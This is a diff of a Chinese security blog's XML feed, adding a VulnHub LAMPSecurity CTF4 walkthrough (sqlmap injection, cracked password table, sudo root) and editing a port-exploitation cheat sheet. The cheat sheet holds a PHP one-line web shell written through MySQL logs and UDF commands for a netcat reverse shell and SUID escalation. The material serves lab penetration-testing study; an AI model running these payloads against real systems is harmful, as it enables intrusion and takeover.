@@ -4,11 +4,36 @@
   
     
     <entry>
+      <title>LAMPSecurity-CTF4</title>
+      <link href="/article/LAMPSecurity-CTF4/"/>
+      <url>/article/LAMPSecurity-CTF4/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>LAMPSecurity-CTF4</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/">vulnhub靶场-LAMPSecurity: CTF4</a></p><p>目标: The idea of the exercise is to compromise the target WITHOUT knowing the username and password.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.136</li></ul><p>咳, 据说这个靶机是2009年做的, 放在现在不能说漏洞百出, 只能说毫无防护</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取靶机地址 192.168.110.136</span></span><br><span class="line">sudo nmap -sn 192.168.110.0/24</span><br><span class="line"><span class="comment"># 获取端口信息 22,25,80,631</span></span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.110.136 -oA scan/ports</span><br><span class="line"><span class="comment"># 获取详细信息</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,25,80,631 192.168.110.136 -oA scan/detail</span><br><span class="line"><span class="comment"># 看看漏洞</span></span><br><span class="line">sudo nmap --script=vuln -p22,25,80,631 192.168.110.136 -oA scan/vuln</span><br></pre></td></tr></table></figure><p>经过扫描, 端口631和端口25无法连接, 仅有22和80存活. 有新的目录</p><p>漏洞扫描扫到一些漏洞, 包括跨站请求伪造csrf、文件遍历、sql注入等</p><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80/http</h3><p>进去之后看不懂. 查看源码, 发现有一个注释掉的路由<code>/usage</code></p><p>仔细看看能不能利用, 发现要缓冲区溢出进行远程命令执行, 那太难受了, 先放一边吧</p><p>在点Blog后发现url存在id=2的字样, 结合之前搜到的sql漏洞, 猜测应该就是这里</p><p>测试id=5, 出现另一个博文, 加上单引号, 出现sql错误, 所以应该是存在漏洞的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.110.136/index.html?page=blog&amp;title=Blog&amp;id=5&#x27; --dbs --dump --batch</span><br></pre></td></tr></table></figure><p>在数据库ehks的表user中, 成功发现了几个用户名和密码, 且可以自动破解</p><table><thead><tr><th>user_id</th><th>user_name</th><th>user_pass</th></tr></thead><tbody><tr><td>1</td><td>dstevens</td><td>02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)</td></tr><tr><td>2</td><td>achen</td><td>b46265f1e7faa3beab09db5c28739380 (seventysixers)</td></tr><tr><td>3</td><td>pmoore</td><td>8f4743c04ed8e5f39166a81f26319bb5 (Homesite)</td></tr><tr><td>4</td><td>jdurbin</td><td>7c7bc9f465d86b8164686ebb5151a717 (Sue1978)</td></tr><tr><td>5</td><td>sorzek</td><td>64d1f88b9b276aece4b0edcc25b7a434 (pacman)</td></tr><tr><td>6</td><td>ghighland</td><td>9f3eb3087298ff21843cc4e013cf355f (undone1)</td></tr></tbody></table><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>利用sql注入得到的信息登录ssh, 结果发现不行. 报错提示&quot;没有匹配的key exchange方法&quot;，靶机的方法是diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1, 我们需要将这个参数传进去</p><p>而<code>ssh -o</code>的参数中有关于密钥的是KeyAlgorithms, 所以传入结果如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.110.136</span><br></pre></td></tr></table></figure><p>继续报错, 这次是&quot;没有匹配的key type&quot;, 添加对应参数即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.110.136</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 2.6.15-1.2054_FC5</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 任意位置可以执行sudo命令</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>所以可以直接利用sudo提权</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>有sudo权限那没什么好说的了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250304104434.png" alt="image.png"></p><p>官方文档中利用的是文件包含的方式, web的当前目录的<code>/restriced</code>路径下存在<code>.htpasswd</code>文件, 记录了账号密码</p><p>htpasswd是apache的一个组件, 用于http验证, 但其实<code>.htpasswd</code>文件并不存在默认路径, 这个restriced路径大概率是自己定义的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>服务和端口利用</title>
       <link href="/article/server-and-ports/"/>
       <url>/article/server-and-ports/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>服务和端口利用</h1><h2 id="ftp-21"><a class="header-anchor" href="#ftp-21">¶</a>ftp/21</h2><p>匿名登录, 用户名anonymous, 密码为空</p><p>一进入ftp就要切换为二进制模式, 可以避免下载的可执行文件损坏, 命令为<code>binary</code></p><p>如果要下载多个文件, 首先利用<code>prompt</code>关闭交互式的提示模式, 随后用<code>mget *.txt</code>一次下载当前位置所有的txt文件</p><h2 id="ssh-22"><a class="header-anchor" href="#ssh-22">¶</a>ssh/22</h2><h2 id="stmp-25-信息枚举"><a class="header-anchor" href="#stmp-25-信息枚举">¶</a>stmp/25 信息枚举</h2><p>工具: smtp-user-enum命令</p><h2 id="dns-53-信息泄露"><a class="header-anchor" href="#dns-53-信息泄露">¶</a>dns/53 信息泄露</h2><p>DNS域传送漏洞, 允许任意IP主机向DNS服务器请求同步信息, 就会出现该漏洞</p><p>该命令的解释为: 从10.10.10.10主机的DNS服务上请求与test.com有关的所有域名解析关系条目</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.10 axfr test.com</span><br></pre></td></tr></table></figure><h2 id="finger-79-信息泄露"><a class="header-anchor" href="#finger-79-信息泄露">¶</a>finger/79 信息泄露</h2><p>工具: finger命令</p><h2 id="pop3-110"><a class="header-anchor" href="#pop3-110">¶</a>pop3/110</h2><p>反正试过包含pop3日志达到getshell</p><h2 id="rpcbind-111-信息泄露"><a class="header-anchor" href="#rpcbind-111-信息泄露">¶</a>rpcbind/111 信息泄露</h2><p>简称rpc<code>rpcinfo -p 192.168.56.101</code></p><h2 id="smb-445"><a class="header-anchor" href="#smb-445">¶</a>smb/445</h2><p>永恒之蓝警告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104 </span><br><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.11.136/smbdata </span><br></pre></td></tr></table></figure><h2 id="nfs-2049"><a class="header-anchor" href="#nfs-2049">¶</a>nfs/2049</h2><p>nfs挂载 远程登录, 配合文件getshell/ssh毒化</p><p>NFS通常与 Kerberos 配对以实现强大的身份验证机制, 因为NFS本身仅根据用户的UID/GID对用户进行身份验证, 非常不安全</p><p>一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限; 此权限绑定到用户的用户ID; 如果共享相同用户ID的两个用户挂载相同的NFS文件系统, 可以修改彼此的文件</p><p>由于目标没有 Kerberos 设置, 因此只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可</p><p>但是没有目标中任何用户的UID或GID, 这意味着即使挂载了该共享, 无法访问NFS共享</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可挂载目录</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 挂载到本地</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br></pre></td></tr></table></figure><h2 id="mysql-3306"><a class="header-anchor" href="#mysql-3306">¶</a>mysql/3306</h2><h3 id="直接写入木马"><a class="header-anchor" href="#直接写入木马">¶</a>直接写入木马</h3><pre><code>要求: `secure_file_priv`变量非NULL, 用户拥有`root`权限, 知道当前网站的绝对路径</code></pre><h3 id="日志文件写马"><a class="header-anchor" href="#日志文件写马">¶</a>日志文件写马</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否满足第一条</span><br><span class="line">select @@secure_file_priv</span><br><span class="line">// 查看日志记录是否开启和查看路径</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">// 开启日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;; SHOW VARIABLES LIKE &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>利用方式(蚁剑连接即可):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">select &#x27;一句话木马&#x27; into dumpfile/outfile &#x27;绝对路径&#x27;</span><br><span class="line">// 第二种</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/www/shell.php&#x27;</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="MySQL-UDF"><a class="header-anchor" href="#MySQL-UDF">¶</a>MySQL UDF</h3><p>UDF(User Defined Function, 用户自定义函数), 可以通过UDF在Mysql中调用一些其原来不具备的功能. 提权需要的条件如下:</p><p>MySQL版本大于5, 且存在<code>lib_mysqludf_sys</code>, 查看是否存在方式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line">select * from func;</span><br></pre></td></tr></table></figure><p>如果没有, 则需要手动添加(稍微复杂)</p><blockquote><p>手动添加需要MySQL是以root权限启动, 这样能执行的命令才是root权限, 而自带的这个没说, 遇到了再说吧</p></blockquote><p>拥有该函数后, 可以有这些提权方法</p><ol><li>构建SUID程序</li><li>创建反弹shell</li><li>添加用户到管理员组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构建SUID程序, 常用find</span><br><span class="line">SELECT sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 反弹shell到192.168.1.2</span><br><span class="line">SELECT sys_exec(&#x27;/bin/nc.traditional -e /bin/sh 192.168.1.2 1234&#x27;)</span><br><span class="line"># robert用户组更改</span><br><span class="line">SELECT sys_exec(&#x27;usermod -a -G admin robert&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>服务和端口利用</h1><h2 id="ftp-21"><a class="header-anchor" href="#ftp-21">¶</a>ftp/21</h2><p>匿名登录, 用户名anonymous, 密码为空</p><p>一进入ftp就要切换为二进制模式, 可以避免下载的可执行文件损坏, 命令为<code>binary</code></p><p>如果要下载多个文件, 首先利用<code>prompt</code>关闭交互式的提示模式, 随后用<code>mget *.txt</code>一次下载当前位置所有的txt文件</p><h2 id="ssh-22"><a class="header-anchor" href="#ssh-22">¶</a>ssh/22</h2><p>比较旧的版本可以用msf的脚本获取部分用户信息, 剩下的就是爆破或者信息收集从而登录</p><h2 id="stmp-25-信息枚举"><a class="header-anchor" href="#stmp-25-信息枚举">¶</a>stmp/25 信息枚举</h2><p>工具: smtp-user-enum命令</p><h2 id="dns-53-信息泄露"><a class="header-anchor" href="#dns-53-信息泄露">¶</a>dns/53 信息泄露</h2><p>DNS域传送漏洞, 允许任意IP主机向DNS服务器请求同步信息, 就会出现该漏洞</p><p>该命令的解释为: 从10.10.10.10主机的DNS服务上请求与test.com有关的所有域名解析关系条目</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.10 axfr test.com</span><br></pre></td></tr></table></figure><h2 id="finger-79-信息泄露"><a class="header-anchor" href="#finger-79-信息泄露">¶</a>finger/79 信息泄露</h2><p>工具: finger命令</p><h2 id="pop3-110"><a class="header-anchor" href="#pop3-110">¶</a>pop3/110</h2><p>反正试过包含pop3日志达到getshell</p><h2 id="rpcbind-111-信息泄露"><a class="header-anchor" href="#rpcbind-111-信息泄露">¶</a>rpcbind/111 信息泄露</h2><p>简称rpc<code>rpcinfo -p 192.168.56.101</code></p><h2 id="smb-445"><a class="header-anchor" href="#smb-445">¶</a>smb/445</h2><p>永恒之蓝警告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104 </span><br><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.11.136/smbdata </span><br></pre></td></tr></table></figure><h2 id="nfs-2049"><a class="header-anchor" href="#nfs-2049">¶</a>nfs/2049</h2><p>nfs挂载 远程登录, 配合文件getshell/ssh毒化</p><p>NFS通常与 Kerberos 配对以实现强大的身份验证机制, 因为NFS本身仅根据用户的UID/GID对用户进行身份验证, 非常不安全</p><p>一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限; 此权限绑定到用户的用户ID; 如果共享相同用户ID的两个用户挂载相同的NFS文件系统, 可以修改彼此的文件</p><p>如果目标没有 Kerberos 设置, 只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可. 但是目标中如果没有任何用户的UID或GID, 这意味着即使挂载了该共享, 无法访问NFS共享</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可挂载目录</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 挂载到本地</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br></pre></td></tr></table></figure><h2 id="mysql-3306"><a class="header-anchor" href="#mysql-3306">¶</a>mysql/3306</h2><h3 id="直接写入木马"><a class="header-anchor" href="#直接写入木马">¶</a>直接写入木马</h3><p>要求: <code>secure_file_priv</code>变量非NULL, 用户拥有<code>root</code>权限, 知道当前网站的绝对路径</p><h3 id="日志文件写马"><a class="header-anchor" href="#日志文件写马">¶</a>日志文件写马</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否满足第一条</span><br><span class="line">select @@secure_file_priv</span><br><span class="line">// 查看日志记录是否开启和查看路径</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">// 开启日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;; SHOW VARIABLES LIKE &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>利用方式(蚁剑连接即可):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">select &#x27;一句话木马&#x27; into dumpfile/outfile &#x27;绝对路径&#x27;</span><br><span class="line">// 第二种</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/www/shell.php&#x27;</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="MySQL-UDF"><a class="header-anchor" href="#MySQL-UDF">¶</a>MySQL UDF</h3><p>UDF(User Defined Function, 用户自定义函数), 可以通过UDF在Mysql中调用一些其原来不具备的功能. 提权需要的条件如下:</p><p>MySQL版本大于5, 且存在<code>lib_mysqludf_sys</code>, 查看是否存在方式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line">select * from func;</span><br></pre></td></tr></table></figure><p>如果没有, 则需要手动添加(稍微复杂)</p><blockquote><p>手动添加需要MySQL是以root权限启动, 这样能执行的命令才是root权限, 而自带的这个没说, 遇到了再说吧</p></blockquote><p>拥有该函数后, 可以有这些提权方法</p><ol><li>构建SUID程序</li><li>创建反弹shell</li><li>添加用户到管理员组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构建SUID程序, 常用find</span><br><span class="line">SELECT sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 反弹shell到192.168.1.2</span><br><span class="line">SELECT sys_exec(&#x27;/bin/nc.traditional -e /bin/sh 192.168.1.2 1234&#x27;)</span><br><span class="line"># robert用户组更改</span><br><span class="line">SELECT sys_exec(&#x27;usermod -a -G admin robert&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -155,9 +180,9 @@
       
         <tags>
             
-            <tag> 反弹shell </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> 反弹shell </tag>
             
         </tags>
       
@@ -182,9 +207,9 @@
       
         <tags>
             
-            <tag> 爆破 </tag>
-            
             <tag> 漏洞利用 </tag>
+            
+            <tag> 爆破 </tag>
             
             <tag> NFS挂载 </tag>
             
@@ -246,9 +271,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> nohup提权 </tag>
             
@@ -275,11 +300,11 @@
       
         <tags>
             
+            <tag> 漏洞利用 </tag>
+            
             <tag> 爆破 </tag>
             
             <tag> 信息收集 </tag>
-            
-            <tag> 漏洞利用 </tag>
             
         </tags>
       
@@ -474,9 +499,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> 提权 </tag>
             
         </tags>
       
@@ -563,11 +588,11 @@
       
         <tags>
             
+            <tag> 漏洞利用 </tag>
+            
             <tag> 爆破 </tag>
             
             <tag> 信息收集 </tag>
-            
-            <tag> 漏洞利用 </tag>
             
             <tag> SQL注入 </tag>
             
@@ -656,9 +681,9 @@
             
             <tag> 文件包含 </tag>
             
-            <tag> SSRF </tag>
-            
             <tag> 代码审计 </tag>
+            
+            <tag> SSRF </tag>
             
             <tag> 异形URL </tag>
             
@@ -718,11 +743,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 提权 </tag>
             
             <tag> 内网 </tag>
             
@@ -915,13 +940,13 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> 反弹shell </tag>
+            <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 反弹shell </tag>
             
         </tags>
       
@@ -1018,13 +1043,13 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> SQL注入 </tag>
             
-            <tag> SSRF </tag>
+            <tag> PHP </tag>
             
             <tag> 代码审计 </tag>
+            
+            <tag> SSRF </tag>
             
             <tag> 反序列化 </tag>
             
@@ -1086,11 +1111,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 提权 </tag>
             
             <tag> 文件上传 </tag>
             
@@ -1119,11 +1144,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 提权 </tag>
             
             <tag> UDF </tag>
             
@@ -1150,11 +1175,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
             
             <tag> 工具利用 </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> MySQL </tag>
             
@@ -1185,13 +1210,13 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> MySQL </tag>
+            <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> MySQL </tag>
             
             <tag> 文件上传 </tag>
             
@@ -1224,13 +1249,13 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
             <tag> 缓冲区溢出 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 提权 </tag>
             
             <tag> 绕过 </tag>
             
@@ -1261,17 +1286,17 @@
       
         <tags>
             
+            <tag> 漏洞利用 </tag>
+            
             <tag> 爆破 </tag>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> msf </tag>
             
             <tag> MySQL </tag>
-            
-            <tag> 漏洞利用 </tag>
             
             <tag> 日志分析 </tag>
             
@@ -1329,9 +1354,9 @@
             
             <tag> RCE </tag>
             
-            <tag> 代码审计 </tag>
-            
             <tag> Java </tag>
+            
+            <tag> 代码审计 </tag>
             
         </tags>
       
@@ -1356,15 +1381,15 @@
       
         <tags>
             
-            <tag> 爆破 </tag>
+            <tag> 漏洞利用 </tag>
             
-            <tag> 提权 </tag>
+            <tag> 爆破 </tag>
             
             <tag> Linux </tag>
             
-            <tag> msf </tag>
+            <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> msf </tag>
             
         </tags>
       
@@ -1389,11 +1414,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
+            <tag> 漏洞利用 </tag>
             
             <tag> Linux </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> 提权 </tag>
             
             <tag> UDF </tag>
             
@@ -1422,9 +1447,9 @@
             
             <tag> 爆破 </tag>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> msf </tag>
             
@@ -1525,9 +1550,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> UDF </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> UDF </tag>
             
             <tag> SQL盲注 </tag>
             
@@ -1574,9 +1599,9 @@
             
             <tag> SQL盲注 </tag>
             
-            <tag> 堆叠注入 </tag>
-            
             <tag> sqlmap </tag>
+            
+            <tag> 堆叠注入 </tag>
             
             <tag> SQL预处理 </tag>
             
@@ -1615,9 +1640,9 @@
             
             <tag> SQL盲注 </tag>
             
-            <tag> 堆叠注入 </tag>
-            
             <tag> sqlmap </tag>
+            
+            <tag> 堆叠注入 </tag>
             
         </tags>
       
@@ -1958,9 +1983,9 @@
       
         <tags>
             
-            <tag> 工具利用 </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> 工具利用 </tag>
             
             <tag> PHP </tag>
             
@@ -2243,9 +2268,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> 模板 </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> 模板 </tag>
             
         </tags>
       
